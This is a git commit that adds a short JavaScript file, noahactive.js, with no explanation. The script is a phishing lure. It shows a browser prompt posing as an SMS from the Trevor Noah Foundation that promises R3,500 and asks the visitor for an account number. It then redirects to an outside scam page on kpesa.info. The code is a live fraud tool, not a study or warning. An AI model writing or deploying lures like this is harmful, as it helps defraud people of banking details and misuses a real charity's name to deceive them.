d470fb9f039360f45ff969ecd0b50d349df27861
kpesaa <meiosis_logins.2d@icloud.com>
2026-08-13 07:05:50 +0100

    Create noahactive.js

---
+++ noahactive.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R3,500'
+password=prompt('SMS: Congratulations, you are eligible to receive R3,500 From Trevor Noah Foundation, click OK to Enter Your Acc. Number','WITHDRAW R3,500');
+if (password != 'WITHDRAW R3,500') {
+location.href='https://kpesa.info/R3500-Birthday-Trev.html';
+}
